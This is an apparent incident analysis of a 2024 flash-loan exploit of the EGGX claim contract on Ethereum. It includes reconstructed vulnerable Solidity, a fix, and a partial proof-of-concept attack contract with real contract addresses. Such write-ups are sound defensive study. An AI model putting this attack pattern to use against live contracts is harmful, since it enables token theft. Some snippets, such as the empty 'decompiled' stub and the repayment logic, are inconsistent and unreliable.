# EGGX — Flash Loan-Based NFT Claim Validation Bypass Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02 |
| **Protocol** | EGGX |
| **Chain** | Ethereum |
| **Loss** | ~2 ETH |
| **Vulnerable Contract** | [EGGXClaim 0xFb35DE57](https://etherscan.io/address/0xFb35DE57B117FA770761C1A344784075745F84F9) |
| **EGGX Token** | [0xe2f95ee8](https://etherscan.io/address/0xe2f95ee8B72fFed59bC4D2F35b1d19b909A6e6b3) |
| **UniV3 Pool** | [0x26beBB69](https://etherscan.io/address/0x26beBB6995a4736F088D129E82620eBA899B944F) |
| **Root Cause** | `EGGXClaim.check()` does not properly validate NFT ownership or prior claim status, enabling repeated claims against 36 NFT IDs using a temporary balance |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/EGGX_exp.sol) |

---

## 1. Vulnerability Overview

The `EGGXClaim.check()` function in the EGGX protocol does not verify NFT ownership or whether a claim has already been made. The attacker flash loaned the entire EGGX pool balance from Uniswap V3 for 0 WETH, then repeatedly called `check()` across 6 batches of 6 NFT IDs each (36 total) to mint tokens.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: check() has no claim validation
interface IEGGXClaim {
    function check(uint256[] calldata tokenIds) external;
}

// Internal implementation — no ownership or duplicate claim validation
function check(uint256[] calldata tokenIds) external {
    for (uint i = 0; i < tokenIds.length; i++) {
        // No check for owner of tokenIds[i]
        // No check for prior claim
        _mint(msg.sender, rewardAmount);  // ← anyone can mint
    }
}

// ✅ Safe code: ownership + duplicate claim validation
mapping(uint256 => bool) public claimed;

function check(uint256[] calldata tokenIds) external {
    for (uint i = 0; i < tokenIds.length; i++) {
        uint256 tokenId = tokenIds[i];
        require(IERC721(nft).ownerOf(tokenId) == msg.sender, "not owner");
        require(!claimed[tokenId], "already claimed");
        claimed[tokenId] = true;
        _mint(msg.sender, rewardAmount);
    }
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: EGGX_decompiled.sol
contract EGGX {
    function balanceOf(address p0) external view returns (uint256) {}  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Uniswap V3 flash: borrow entire EGGX pool balance for 0 WETH
  │
  ├─→ [2] Enter uniswapV3FlashCallback()
  │
  ├─→ [3] 6 batches × 6 NFT IDs = 36 check() calls
  │         └─ EGGX tokens minted on each call (no ownership validation)
  │
  ├─→ [4] Repay flash loan (including fee)
  │
  ├─→ [5] Accumulated EGGX → swap for WETH on Uniswap V3
  │
  └─→ [6] ~2 ETH profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IEGGXUNIV3POOL {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data) external returns (int256, int256);
}

interface IEGGXClaim {
    function check(uint256[] calldata tokenIds) external;
}

contract AttackContract {
    IEGGXUNIV3POOL constant pool = IEGGXUNIV3POOL(0x26beBB6995a4736F088D129E82620eBA899B944F);
    IEGGXClaim    constant claim = IEGGXClaim(0xFb35DE57B117FA770761C1A344784075745F84F9);
    IERC20        constant EGGX  = IERC20(0xe2f95ee8B72fFed59bC4D2F35b1d19b909A6e6b3);

    function testExploit() external {
        // [1] Flash loan the entire pool EGGX balance for 0 WETH
        uint256 eggxBalance = EGGX.balanceOf(address(pool));
        pool.flash(address(this), 0, eggxBalance, "");
    }

    function uniswapV3FlashCallback(uint256, uint256, bytes calldata) external {
        // [2] Repeatedly call check() per NFT ID batch
        uint256[][] memory batches = new uint256[][](6);
        // ... assign 6 NFT IDs to each batch

        for (uint i = 0; i < 6; i++) {
            claim.check(batches[i]);  // Mints EGGX without ownership validation
        }

        // [3] Repay flash loan
        uint256 poolBalance = EGGX.balanceOf(address(pool));
        EGGX.transfer(address(pool), poolBalance); // Return principal

        // [4] Swap remaining EGGX → WETH
        // ... swap call
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing NFT Claim Validation |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (flash loan + direct claim function call) |
| **DApp Category** | ERC20/NFT airdrop claim contract |
| **Impact** | Unauthorized token minting drains liquidity pool funds |

## 6. Remediation Recommendations

1. **Ownership validation**: Verify caller ownership of each NFT ID via `ownerOf()` on every `check()` call
2. **Duplicate claim prevention**: Use a `claimed[tokenId]` mapping to block reuse of already-claimed IDs
3. **Merkle proof approach**: Manage the eligible address list as a Merkle tree to verify claim eligibility
4. **Claim window restriction**: Restrict claims to a specific block range only

## 7. Lessons Learned

- NFT claim functions must include ownership validation and duplicate claim prevention logic.
- The attack pattern of flash borrowing an entire pool balance targets any function with weak validation.
- Even low-value losses (~$2K) caused by claim vulnerabilities represent structural flaws and must be patched immediately.